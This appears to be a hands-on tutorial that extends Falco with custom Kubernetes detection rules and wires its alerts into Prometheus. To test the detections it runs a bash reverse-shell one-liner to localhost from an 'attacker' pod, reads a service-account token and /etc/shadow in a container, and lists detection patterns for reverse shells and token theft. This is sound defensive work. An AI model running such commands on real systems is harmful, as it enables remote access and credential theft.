# Demo: Custom Rules and Prometheus Integration

This demo extends Falco with custom detection rules targeting specific attack patterns and integrates alerts with Prometheus for unified security monitoring. Custom rules let you detect threats specific to your environment while Prometheus provides real-time alerting and dashboards.

## Prerequisites

- [Docker](https://docs.docker.com/get-docker/) - Container runtime
- [k3d](https://k3d.io/) - k3s in Docker
- [kubectl](https://kubernetes.io/docs/tasks/tools/) - Kubernetes CLI
- [Helm](https://helm.sh/docs/intro/install/) - Package manager

Run the [setup script](/m2/demo2/setup.ps1):

```powershell
./setup.ps1
```

> Creates a k3d cluster and deploys the WiredBrain app.

## Demo

### Review custom Falco rules

Default Falco rules cover common attacks, but custom rules let you detect threats specific to your environment - patterns you've seen in red team exercises or threat intelligence.

- [falco-custom-rules.yaml](/m2/demo2/falco-custom-rules.yaml) - Custom detection rules

<!--HIGHLIGHT>
Reverse Shell Spawned
spawned_process
bash, sh, ash, dash, ksh, zsh
proc.cmdline contains "ncat -e"
Service Account Token Read
open_read
/var/run/secrets/kubernetes.io/serviceaccount
Crypto Miner Execution
Package Manager In Container
-->

> Custom rules extend Falco's detection capabilities with organization-specific patterns: reverse shells, service account token theft, crypto miners, package manager execution.

### Deploy Falco with custom rules

Deploy Falco with both the default ruleset and our custom rules loaded from a separate values file.

```powershell
helm install falco ./charts/falco-7.2.0.tgz `
  -f falco-values.yaml `
  -f falco-custom-rules.yaml `
  --namespace falco --create-namespace `
  --wait --timeout 5m

kubectl get pods -n falco
```

> Falco loads both default rules and our custom rules from the ConfigMap.

### Deploy Falcosidekick for metrics

Falcosidekick is a companion tool that receives Falco alerts and forwards them to multiple outputs - including Prometheus metrics.

- [falcosidekick-values.yaml](/m2/demo2/falcosidekick-values.yaml) - Falcosidekick configuration

<!--HIGHLIGHT>
prometheus
-->

```powershell
helm install falcosidekick ./charts/falcosidekick-0.9.3.tgz `
  -f falcosidekick-values.yaml `
  --namespace falco `
  --wait

kubectl get pods -n falco
```

> Falcosidekick receives alerts from Falco and exposes them as Prometheus metrics on port 2801.

### Review Prometheus alerting rules

Prometheus alerting rules turn Falco metrics into actionable alerts - notifying the security team when attack patterns are detected.

- [prometheus-alerts.yaml](/m2/demo2/prometheus-alerts.yaml) - Security alerting rules

<!--HIGHLIGHT>
FalcoCriticalAlert
falcosecurity_falcosidekick_falco_events_total
ReverseShellDetected
SensitiveFileAccess
HighFalcoEventRate
-->

> Alerting rules trigger on critical events, reverse shells, and repeated sensitive file access.

### Deploy Prometheus

Deploy Prometheus with scrape configuration for Falcosidekick and our security alerting rules.

```powershell
helm install prometheus ./charts/prometheus-27.0.0.tgz `
  -f prometheus-values.yaml `
  -f prometheus-scrape.yaml `
  -f prometheus-alerts.yaml `
  --namespace monitoring --create-namespace `
  --wait

kubectl get pods -n monitoring
```

### Access the Prometheus UI

Verify Prometheus is scraping Falcosidekick and the alerting rules are loaded.

- [open Prometheus targets](http://localhost:9090/targets) - Verify scrape targets
- [navigate to Alerts](http://localhost:9090/alerts) - View configured alerting rules

> All alerts should be inactive initially.

### Wait for metrics pipeline

Wait for Falco events to flow through Falcosidekick to Prometheus:

```powershell
./wait-prometheus.ps1
```

> Verifies the complete metrics pipeline is ready.

### Trigger the custom rules

Generate security events to trigger our custom rules:

```powershell
# Trigger service account token read (custom rule)
kubectl exec -n wiredbrain deploy/wiredbrain-web -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Trigger sensitive file access (default rule) - multiple times to exceed threshold
1..4 | % { kubectl exec -n wiredbrain deploy/wiredbrain-web -- cat /etc/shadow }
```

### Trigger reverse shell detection

The reverse shell rule detects shells executing with network redirection patterns. Our production containers don't have bash (good practice), so we'll use a test pod to demonstrate:

```powershell
# Create a test pod with bash (simulating an attacker's tooling)
kubectl run attacker --image=bash:5 -n wiredbrain --restart=Never --command -- sleep 300

kubectl wait --for=condition=Ready pod/attacker -n wiredbrain --timeout=30s

# Trigger reverse shell pattern (runs in background to avoid blocking)
1..3 | % { kubectl exec -n wiredbrain attacker -- bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null }

# Wait for Prometheus to scrape, then trigger again to create detectable increase
Start-Sleep -Seconds 10

1..3 | % { kubectl exec -n wiredbrain attacker -- bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null }
```

> The connections fail (no listener), but Falco detects the reverse shell pattern. We trigger twice with a delay so Prometheus captures the increase.

### View Falco alerts

Check that custom rules are triggering:

```powershell
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=500 | `
  Where-Object { $_ -match "^\{" } | `
  ForEach-Object { $_ | ConvertFrom-Json } | `
  Where-Object { $_.output_fields."k8s.ns.name" -eq "wiredbrain" -and $_.priority -in @("Warning", "Notice", "Critical") } | `
  Select-Object time, rule, priority | `
  Format-Table
```

> Both default and custom rule alerts appear - including our "Service Account Token Read" rule.

### View formatted alert details

Examine the full JSON alert to see all the context Falco captures.

```powershell
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=500 | `
  Where-Object { $_ -match "^\{" } | `
  ForEach-Object { $_ | ConvertFrom-Json } | `
  Where-Object { $_.output_fields."k8s.ns.name" -eq "wiredbrain" -and $_.rule -eq "Service Account Token Read" } | `
  Select-Object -Last 1 | `
  ConvertTo-Json -Depth 5
```

> The custom rule captures the full context: process, file, container, pod, namespace.

### Query Falcosidekick metrics

Check Falcosidekick is exposing metrics:

```powershell
curl -s http://localhost:9090/api/v1/query?query=up | jq '.data.result[] | {target: .metric.job, status: .value[1]}'
```

### Wait for alerts to fire

Wait for the security alerts to trigger:

```powershell
./wait-alert.ps1 -AlertName "FalcoCriticalAlert"
```

> The FalcoCriticalAlert fires when the reverse shell (critical priority) is detected.

### View alerts in Prometheus

Check if our security alerting rules have fired based on the Falco events.

- [Events by priority](http://localhost:9090/query?g0.expr=sum+by+%28priority_raw%29+%28falcosecurity_falcosidekick_falco_events_total%29&g0.tab=table)
- [Check firing alerts](http://localhost:9090/alerts)

> Three alerts should be firing: FalcoCriticalAlert, ReverseShellDetected, and SensitiveFileAccess.
